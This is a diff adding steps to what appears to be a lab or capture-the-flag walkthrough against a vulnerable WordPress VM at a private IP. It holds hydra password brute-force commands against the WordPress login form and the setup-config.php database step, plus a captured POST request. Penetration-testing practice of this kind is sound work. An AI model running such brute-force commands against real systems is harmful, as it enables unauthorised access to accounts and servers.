@@ -110,3 +110,37 @@ Nmap done: 1 IP address (1 host up) scanned in 9.75 seconds
 31337 - Elite
 
 
+```
+hydra -l pinky1337 -P passwordlist.txt 192.168.126.131 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+```
+
+```
+
+POST /wordpress/wp-admin/setup-config.php?step=2 HTTP/1.1
+
+Host: 192.168.126.131
+
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Referer: http://192.168.126.131/wordpress/wp-admin/setup-config.php?step=1
+
+Connection: close
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 86
+
+
+
+dbname=database&uname=root&pwd=root&dbhost=localhost&prefix=wp_&language=&submit=Submit
+```
+
+
+```
+hydra -L users.txt -P passwordlist.txt 192.168.126.131 -V http-form-post '/wordpress/wp-admin/setup-config.php?step=2:dbname=database&uname=^USER^&pwd=^PASS^&dbhost=localhost&prefix=wp_&language=&submit=Submit:Error establishing a database connection'
+```
+
